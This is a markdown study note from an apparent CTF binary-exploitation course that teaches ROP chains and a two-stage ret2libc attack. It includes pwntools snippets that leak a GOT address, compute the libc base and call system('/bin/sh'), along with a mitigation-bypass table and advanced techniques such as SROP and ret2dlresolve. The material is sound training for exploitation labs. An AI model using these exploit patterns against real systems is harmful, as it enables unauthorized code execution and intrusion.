---
tags: [ctf, pwn, rop, ret2libc, aslr]
day: 4
---

# Day 4 — ROP and Mitigation Bypass

Back: [[practical-binary-analysis/Practical Binary Analysis - Master Index|Practical Binary Analysis — Complete Companion]]

## ROP mental model

A ROP chain is a synthetic stack. Each `ret` loads the next gadget address; pop gadgets consume subsequent values.

```text
pop rdi; ret
desired rdi value
target function
safe return address
```

Track `rsp` after every instruction. Gadget side effects and extra pops matter.

## Two-stage ret2libc

With randomized libc:

1. Call an output function on a resolved GOT entry.
2. Return to code that reads a second payload.
3. Parse the leaked runtime address.
4. Subtract its stable symbol offset to calculate libc base.
5. Add stable offsets for the final function and argument.

```text
libc base = leaked puts address - puts offset
target address = libc base + target offset
```

Stage-one pattern:

```python
rop = ROP(exe)
rop.call(exe.plt["puts"], [exe.got["puts"]])
rop.call(exe.sym["main"])
payload = flat(b"A" * offset, rop.chain())
```

After receiving the leak:

```python
leak = u64(raw_leak.ljust(8, b"\0"))
libc.address = leak - libc.sym["puts"]
assert libc.address & 0xfff == 0
```

Stage two:

```python
rop = ROP([exe, libc])
arg = next(libc.search(b"/bin/sh\0"))
rop.call(libc.sym["system"], [arg])
```

Parsing must match the binary; blindly using `recvline().strip()` can destroy meaningful bytes.

## Mitigation reasoning

| Protection | Removes | Need |
|---|---|---|
| NX | injected data execution | ROP or another executable region |
| ASLR | fixed library/stack addresses | leak or justified partial overwrite |
| PIE | fixed executable addresses | binary pointer leak |
| Canary | direct contiguous return overwrite | leak/preserve it or alternate bug |
| Full RELRO | GOT replacement | alternate control target or ROP |

For PIE:

```text
binary base = leaked code pointer - known code offset
```

Some libc functions require correct 16-byte stack alignment. An extra `ret` gadget often repairs alignment, but confirm in the debugger.

## Advanced concepts

- Stack pivot: move `rsp` into a larger controlled buffer.
- SROP: craft signal-restoration state to load many registers.
- ret2dlresolve: make the dynamic resolver resolve an attacker-chosen symbol.
- ORW: open/read/write when a sandbox blocks direct process-spawn paths.

Use these only when target constraints require them.

## Labs and gate

- [ ] Build a manual gadget chain.
- [ ] Leak one GOT address and calculate libc base.
- [ ] Complete a two-stage ret2libc challenge.
- [ ] Explain every mitigation and chain transition.

**Gate:** unseen NX+ASLR target, all addresses derived, assertions included, 10/10 clean runs.

Next: [[crash-course/Day 5 - Format Strings and Heap]]

